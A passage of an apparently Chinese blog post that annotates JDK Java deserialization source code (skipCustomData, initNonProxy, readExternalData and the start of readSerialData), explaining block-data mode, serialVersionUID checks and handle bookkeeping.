readObject 调用结束后，若该层 hasWriteObjectData 为真，这里要把剩余</span></span><br><span class="line"><span class="comment"> *   的块/对象全部跳过，直到 ENDBLOCKDATA。</span></span><br><span class="line"><span class="comment"> * - Externalizable 且使用块数据（SC_BLOCK_DATA）时，readExternal 返回后，</span></span><br><span class="line"><span class="comment"> *   同样需要跳过残余块直至 ENDBLOCKDATA。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 语义要点：</span></span><br><span class="line"><span class="comment"> * - Block-Data 模式下可能夹杂 TC_BLOCKDATA / TC_BLOCKDATALONG 多个块，</span></span><br><span class="line"><span class="comment"> *   也可能夹杂对象（writeObject 会临时切至“非块模式”输出 TC_* 标记）。</span></span><br><span class="line"><span class="comment"> * - 本方法既会“批量跳过块”，也会在必要时递归读取对象（readObject0(false)），</span></span><br><span class="line"><span class="comment"> *   直到真正看到 TC_ENDBLOCKDATA 才返回。</span></span><br><span class="line"><span class="comment"> * - 返回前恢复 passHandle（保持外层上下文的当前句柄不被污染）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">skipCustomData</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">oldHandle</span> <span class="operator">=</span> passHandle; <span class="comment">// 保护外层当前句柄</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">if</span> (bin.getBlockDataMode()) &#123;</span><br><span class="line">            <span class="comment">// 若仍在块模式：一次性跳过当前 block 的剩余字节，然后切回非块模式</span></span><br><span class="line">            bin.skipBlockData();</span><br><span class="line">            bin.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 此时处于“非块模式”，窥视下一个类型码决定后续动作</span></span><br><span class="line">        <span class="keyword">switch</span> (bin.peekByte()) &#123;</span><br><span class="line">            <span class="keyword">case</span> TC_BLOCKDATA:</span><br><span class="line">            <span class="keyword">case</span> TC_BLOCKDATALONG:</span><br><span class="line">                <span class="comment">// 下一个是新的 block 开头：切回块模式，循环顶端会把它跳过</span></span><br><span class="line">                bin.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_ENDBLOCKDATA:</span><br><span class="line">                <span class="comment">// 注解/自定义数据区的结束标记：消费并收尾返回</span></span><br><span class="line">                bin.readByte();</span><br><span class="line">                passHandle = oldHandle; <span class="comment">// 恢复外层句柄</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="comment">// 既不是 block 也不是 ENDBLOCKDATA：那就是穿插的对象/数组/字符串等</span></span><br><span class="line">                <span class="comment">// 递归读取并丢弃其值（共享语义 false），直到最终遇到 ENDBLOCKDATA</span></span><br><span class="line">                readObject0(<span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>接着，会调用 <code>ObjectStreamClass</code> 中的 <code>initNonProxy</code> 方法，在这个方法里会初始化表示非代理类的类描述符。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 初始化“非代理类（non-proxy）”的类描述符（ObjectStreamClass）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 语境说明（反序列化侧）：</span></span><br><span class="line"><span class="comment"> * - model     ：来自“流中 classDesc”的模板（按对端写出的结构解析得到），可理解为“流端模型”。</span></span><br><span class="line"><span class="comment"> * - cl        ：本地 JVM 中解析到的实际 Class（若本地类缺失或解析失败，则为 null）。</span></span><br><span class="line"><span class="comment"> * - resolveEx ：解析 cl 过程中捕获到的 CNFE（若有）。</span></span><br><span class="line"><span class="comment"> * - superDesc ：已初始化好的“父类”的 ObjectStreamClass（可为 null，表示到达 Object 顶层）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 目标：</span></span><br><span class="line"><span class="comment"> * - 将“流端模型”与“本地类（若存在）”进行一致性校验（代理/枚举/可序列化语义/SUID/类名等）。</span></span><br><span class="line"><span class="comment"> * - 将关键元信息（flags/fields/方法钩子/构造器等）绑定到本实例，用于随后对象体的反序列化。</span></span><br><span class="line"><span class="comment"> * - 构建字段反射器（FieldReflector）以确定“默认字段”读取时的字节布局与对象字段顺序映射。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">initNonProxy</span><span class="params">(ObjectStreamClass model,</span></span><br><span class="line"><span class="params">                  Class&lt;?&gt; cl,</span></span><br><span class="line"><span class="params">                  ClassNotFoundException resolveEx,</span></span><br><span class="line"><span class="params">                  ObjectStreamClass superDesc)</span></span><br><span class="line">    <span class="keyword">throws</span> InvalidClassException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 从流端模型取出 SUID；这里通过 Long.valueOf 再拆箱为 long（等价于 model.getSerialVersionUID()）</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">suid</span> <span class="operator">=</span> Long.valueOf(model.getSerialVersionUID());</span><br><span class="line"></span><br><span class="line">    <span class="type">ObjectStreamClass</span> <span class="variable">osc</span> <span class="operator">=</span> <span class="literal">null</span>;  <span class="comment">// 本地类对应的 OSC（若 cl != null 则尝试获取，用于对比与复用）</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cl != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// lookup(cl, true)：构建/查找与本地 Class 绑定的 OSC（“本地描述符”）</span></span><br><span class="line">        osc = lookup(cl, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1) 绝不允许“非代理描述符”去绑定“代理类”</span></span><br><span class="line">        <span class="keyword">if</span> (osc.isProxy) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">                <span class="string">&quot;cannot bind non-proxy descriptor to a proxy class&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) 枚举身份必须一致：流端是 enum，本地也必须是 enum；反之亦然</span></span><br><span class="line">        <span class="keyword">if</span> (model.isEnum != osc.isEnum) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">                model.isEnum</span><br><span class="line">                    ? <span class="string">&quot;cannot bind enum descriptor to a non-enum class&quot;</span></span><br><span class="line">                    : <span class="string">&quot;cannot bind non-enum descriptor to an enum class&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) SUID 一致性：</span></span><br><span class="line">        <span class="comment">//    - 仅当“双方都走 Serializable 语义”（非 Externalizable，且非数组）时严格校验 SUID。</span></span><br><span class="line">        <span class="comment">//    - 若不一致：抛出 InvalidClassException（典型的“本地类不兼容”错误）。</span></span><br><span class="line">        <span class="keyword">if</span> (model.serializable == osc.serializable &amp;&amp;</span><br><span class="line">            !cl.isArray() &amp;&amp;</span><br><span class="line">            suid != osc.getSerialVersionUID())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">                osc.name,</span><br><span class="line">                <span class="string">&quot;local class incompatible: &quot;</span> +</span><br><span class="line">                <span class="string">&quot;stream classdesc serialVersionUID = &quot;</span> + suid +</span><br><span class="line">                <span class="string">&quot;, local class serialVersionUID = &quot;</span> + osc.getSerialVersionUID());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4) 类名一致性（使用 classNamesEqual 以容忍内部/外部命名差异的比较逻辑）</span></span><br><span class="line">        <span class="keyword">if</span> (!classNamesEqual(model.name, osc.name)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">                osc.name,</span><br><span class="line">                <span class="string">&quot;local class name incompatible with stream class &quot;</span> +</span><br><span class="line">                <span class="string">&quot;name \&quot;&quot;</span> + model.name + <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5) 可序列化语义一致性（仅在非 enum 情况下才有意义）</span></span><br><span class="line">        <span class="keyword">if</span> (!model.isEnum) &#123;</span><br><span class="line">            <span class="comment">// 5.a Serializable vs Externalizable 互斥：两端若都“可序列化”，则对 Externalizable 标志必须一致</span></span><br><span class="line">            <span class="keyword">if</span> ((model.serializable == osc.serializable) &amp;&amp;</span><br><span class="line">                (model.externalizable != osc.externalizable))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">                    osc.name,</span><br><span class="line">                    <span class="string">&quot;Serializable incompatible with Externalizable&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 5.b 若在“是否 Serializable/Externalizable”上不一致，或两者都不是</span></span><br><span class="line">            <span class="comment">//     （既非 Serializable 也非 Externalizable），则标记本类“不可反序列化”。</span></span><br><span class="line">            <span class="keyword">if</span> ((model.serializable != osc.serializable) ||</span><br><span class="line">                (model.externalizable != osc.externalizable) ||</span><br><span class="line">                !(model.serializable || model.externalizable))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 注意：这里不是立刻抛出，而是记录到 deserializeEx；</span></span><br><span class="line">                <span class="comment">// 随后在真正读对象数据前会通过 checkDeserialize() 抛出。</span></span><br><span class="line">                deserializeEx = <span class="keyword">new</span> <span class="title class_">ExceptionInfo</span>(</span><br><span class="line">                    osc.name, <span class="string">&quot;class invalid for deserialization&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// —— 绑定“基础元信息”到当前 desc（以流端模型为准；cl/resolveEx/superDesc 直接挂载）——</span></span><br><span class="line">    <span class="built_in">this</span>.cl = cl;                          <span class="comment">// 本地 Class，可为 null（类缺失）</span></span><br><span class="line">    <span class="built_in">this</span>.resolveEx = resolveEx;            <span class="comment">// 解析失败时记录异常以延后报告</span></span><br><span class="line">    <span class="built_in">this</span>.superDesc = superDesc;            <span class="comment">// 父类的 OSC</span></span><br><span class="line">    name = model.name;                     <span class="comment">// 按流端模型的类名</span></span><br><span class="line">    <span class="built_in">this</span>.suid = suid;                      <span class="comment">// 使用流端 SUID（上面已做一致性校验）</span></span><br><span class="line">    isProxy = <span class="literal">false</span>;                       <span class="comment">// 本方法处理的是“非代理类”</span></span><br><span class="line">    isEnum = model.isEnum;                 <span class="comment">// 枚举身份按模型同步（前面已确保一致）</span></span><br><span class="line">    serializable = model.serializable;     <span class="comment">// 是否 Serializable</span></span><br><span class="line">    externalizable = model.externalizable; <span class="comment">// 是否 Externalizable</span></span><br><span class="line">    hasBlockExternalData = model.hasBlockExternalData; <span class="comment">// v2 协议下的 Externalizable 是否块封装</span></span><br><span class="line">    hasWriteObjectData = model.hasWriteObjectData;     <span class="comment">// 是否存在自定义 writeObject 数据段（SC_WRITE_METHOD）</span></span><br><span class="line">    fields = model.fields;                 <span class="comment">// 字段描述（先用模型的，稍后由反射器“匹配重写”）</span></span><br><span class="line">    primDataSize = model.primDataSize;     <span class="comment">// 该层 primitive 字段总字节数（模型计算值）</span></span><br><span class="line">    numObjFields = model.numObjFields;     <span class="comment">// 该层对象字段数量（模型计算值）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// —— 若本地 OSC 存在，则尽量复用“本地信息”（方法钩子/保护域/构造器等）——</span></span><br><span class="line">    <span class="keyword">if</span> (osc != <span class="literal">null</span>) &#123;</span><br><span class="line">        localDesc = osc;                            <span class="comment">// 记录本地描述符</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化/反序列化钩子方法（若存在）：writeObject/readObject/readObjectNoData</span></span><br><span class="line">        writeObjectMethod    = localDesc.writeObjectMethod;</span><br><span class="line">        readObjectMethod     = localDesc.readObjectMethod;</span><br><span class="line">        readObjectNoDataMethod = localDesc.readObjectNoDataMethod;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 替换/解析钩子：writeReplace/readResolve</span></span><br><span class="line">        writeReplaceMethod   = localDesc.writeReplaceMethod;</span><br><span class="line">        readResolveMethod    = localDesc.readResolveMethod;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 若前面未提前记录“不可反序列化”的原因，则沿用本地的错误信息（若有）</span></span><br><span class="line">        <span class="keyword">if</span> (deserializeEx == <span class="literal">null</span>) &#123;</span><br><span class="line">            deserializeEx = localDesc.deserializeEx;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 保护域与可用构造器（无参可访问构造器/特权构造器句柄等，本地准备好的）</span></span><br><span class="line">        domains = localDesc.domains;</span><br><span class="line">        cons    = localDesc.cons;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// —— 为“默认字段”读写建立反射器：确定 primitive 段布局、对象字段顺序与映射关系 —— </span></span><br><span class="line">    fieldRefl = getReflector(fields, localDesc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重要：用反射器“匹配/重写”后的字段数组替换原 fields，</span></span><br><span class="line">    <span class="comment">// 以反映“本地类上的 unshared 设置 / 类型签名差异 / 实际可见性与顺序”等本地侧特性。</span></span><br><span class="line">    fields = fieldRefl.getFields();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 标记初始化完成（后续 checkDeserialize()/默认字段读写等才允许使用）</span></span><br><span class="line">    initialized = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>初始化完毕后会调用 <code>handles</code> 的 <code>finish</code> 方法完成引用 <code>Handle</code> 的赋值操作：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 7) 完成该描述符的构建，允许后续通过句柄回引</span></span><br><span class="line">handles.finish(descHandle);</span><br><span class="line">passHandle = descHandle;</span><br><span class="line"><span class="keyword">return</span> desc;</span><br></pre></td></tr></table></figure></div>

<h4 id="readExternalData"><a href="#readExternalData" class="headerlink" title="readExternalData"></a>readExternalData</h4><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 读取 Externalizable 对象的数据区：</span></span><br><span class="line"><span class="comment"> * - 若 &#123;<span class="doctag">@code</span> obj != null&#125;，通过调用其 &#123;<span class="doctag">@code</span> readExternal(this)&#125; 让对象自行读取；</span></span><br><span class="line"><span class="comment"> * - 若 &#123;<span class="doctag">@code</span> obj == null&#125;（本地无法解析该类），则尽力跳过该对象的外部化数据。</span></span><br><span class="line"><span class="comment"> * - 约定：调用本方法前，&#123;<span class="doctag">@code</span> passHandle&#125; 已指向该对象的句柄。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 协议要点：</span></span><br><span class="line"><span class="comment"> * - 若类描述符带有 SC_BLOCK_DATA（即 &#123;<span class="doctag">@code</span> desc.hasBlockExternalData() == true&#125;），</span></span><br><span class="line"><span class="comment"> *   则写端是在“块数据模式”下写的外部化数据（writeExternal），并以 TC_ENDBLOCKDATA 结束；</span></span><br><span class="line"><span class="comment"> *   读端需切换到块模式，调用 readExternal 后使用 &#123;<span class="doctag">@code</span> skipCustomData()&#125; 吃掉</span></span><br><span class="line"><span class="comment"> *   剩余块，直到读到 TC_ENDBLOCKDATA，确保与写端对齐。</span></span><br><span class="line"><span class="comment"> * - 若不带 SC_BLOCK_DATA（旧协议 v1 样式），外部化数据不是块包裹；如果本地类不存在</span></span><br><span class="line"><span class="comment"> *   或 readExternal 抛 CNF（类缺失），可能无法把所有字节正确消费，流可能失去对齐——</span></span><br><span class="line"><span class="comment"> *   JDK 的做法是“保持历史兼容，先不处理；后续读时如仍有残留会抛 StreamCorruptedException”。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 回调/上下文：</span></span><br><span class="line"><span class="comment"> * - Externalizable 路径不允许 defaultReadObject/readFields 等“默认反序列化 API”，</span></span><br><span class="line"><span class="comment"> *   因此这里会暂时清空 &#123;<span class="doctag">@code</span> curContext&#125;，防止误用；在进入/退出时对旧上下文做完整性检查。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readExternalData</span><span class="params">(Externalizable obj, ObjectStreamClass desc)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 保存并校验外层回调上下文；Externalizable 路径禁止使用“默认反序列化”相关 API</span></span><br><span class="line">    <span class="type">SerialCallbackContext</span> <span class="variable">oldContext</span> <span class="operator">=</span> curContext;</span><br><span class="line">    <span class="keyword">if</span> (oldContext != <span class="literal">null</span>) &#123;</span><br><span class="line">        oldContext.check(); <span class="comment">// 确保外层上下文处于合法可切换状态</span></span><br><span class="line">    &#125;</span><br><span class="line">    curContext = <span class="literal">null</span>;      <span class="comment">// 清空：禁止在 readExternal 内调用 defaultReadObject/readFields</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 是否使用“块数据模式”读取外部化数据（由类描述符 SC_BLOCK_DATA 标志决定）</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">blocked</span> <span class="operator">=</span> desc.hasBlockExternalData();</span><br><span class="line">        <span class="keyword">if</span> (blocked) &#123;</span><br><span class="line">            <span class="comment">// 与写端 writeExternalData(...) 对应：进入块模式以读取 TC_BLOCKDATA* 中的内容</span></span><br><span class="line">            bin.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (obj != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 让对象自己读取并恢复状态；内部可调用 readInt/readObject 等</span></span><br><span class="line">                obj.readExternal(<span class="built_in">this</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * 多数情况下，句柄表在更早阶段已把 CNF 传播到了 passHandle；</span></span><br><span class="line"><span class="comment">                 * 但若 readExternal 中新构造并抛出了一个 CNF，这里补记到句柄表上，</span></span><br><span class="line"><span class="comment">                 * 以便上层在合适时机感知并抛出。</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                handles.markException(passHandle, ex);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (blocked) &#123;</span><br><span class="line">            <span class="comment">// 若采用块模式写入外部化数据：readExternal 可能未完全读尽数据块，</span></span><br><span class="line">            <span class="comment">// 此处负责吞掉剩余的 block-data，直到遇到 TC_ENDBLOCKDATA，并切回非块模式。</span></span><br><span class="line">            skipCustomData();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 恢复并再次校验外层回调上下文，保证未被非法复用</span></span><br><span class="line">        <span class="keyword">if</span> (oldContext != <span class="literal">null</span>) &#123;</span><br><span class="line">            oldContext.check();</span><br><span class="line">        &#125;</span><br><span class="line">        curContext = oldContext;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 说明（历史兼容）：</span></span><br><span class="line"><span class="comment">     * 若外部化数据不是以块形式写入（blocked == false），并且：</span></span><br><span class="line"><span class="comment">     *   - 本地不存在该类（obj == null），或</span></span><br><span class="line"><span class="comment">     *   - readExternal() 抛出了 ClassNotFoundException，</span></span><br><span class="line"><span class="comment">     * 则本次调用可能没有把该对象的全部外部化字节读尽，导致流位置可能与写端不同步。</span></span><br><span class="line"><span class="comment">     * 这里遵循旧实现的策略：不额外干预，假定流仍然同步；若实际还有残留外部化数据，</span></span><br><span class="line"><span class="comment">     * 后续读取时（读到意外的类型码/字节）很可能抛出 StreamCorruptedException。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="readSerialData"><a href="#readSerialData" class="headerlink" title="readSerialData"></a>readSerialData</h4><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 读取给定对象在“每一层可序列化类（从父类→子类）”上的实例数据。</span></span><br><span class="line"><span class="comment"> * - 若 obj 为 null（本地无法解析该类）或当前句柄已记录 CNF 等异常，则仅“跳过”该层字段数据。</span></span><br><span class="line"><span class="comment"> * - 约定：调用前 passHandle 已指向 obj 的句柄。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 数据来源与路径：</span></span><br><span class="line"><span class="comment"> * 1) slots[i].hasData == true：</span></span><br><span class="line"><span class="comment"> *    a) 若该层声明了 private readObject(ObjectInputStream)：</span></span><br><span class="line"><span class="comment"> *       - 进入块数据模式（Block-Data），反射调用 readObject；</span></span><br><span class="line"><span class="comment"> *       - readObject 内部若调用 defaultReadObject()/readFields()，可能设置 defaultDataEnd；</span></span><br><span class="line"><span class="comment"> *         结束后需把 defaultDataEnd 复位为 false；</span></span><br><span class="line"><span class="comment"> *       - 若该层还声明了 writeObject（即 hasWriteObjectData == true），读取完后还需</span></span><br><span class="line"><span class="comment"> *         skipCustomData() 吞掉“自定义数据块”（直到 TC_ENDBLOCKDATA）；否则直接退出块模式。</span></span><br><span class="line"><span class="comment"> *    b) 否则走默认字段读取：defaultReadFields(obj, slotDesc)。</span></span><br><span class="line"><span class="comment"> * 2) slots[i].hasData == false：</span></span><br><span class="line"><span class="comment"> *    - 若该层声明了 readObjectNoData() 且当前对象有效且未记录异常，则调用之，用于</span></span><br><span class="line"><span class="comment"> *      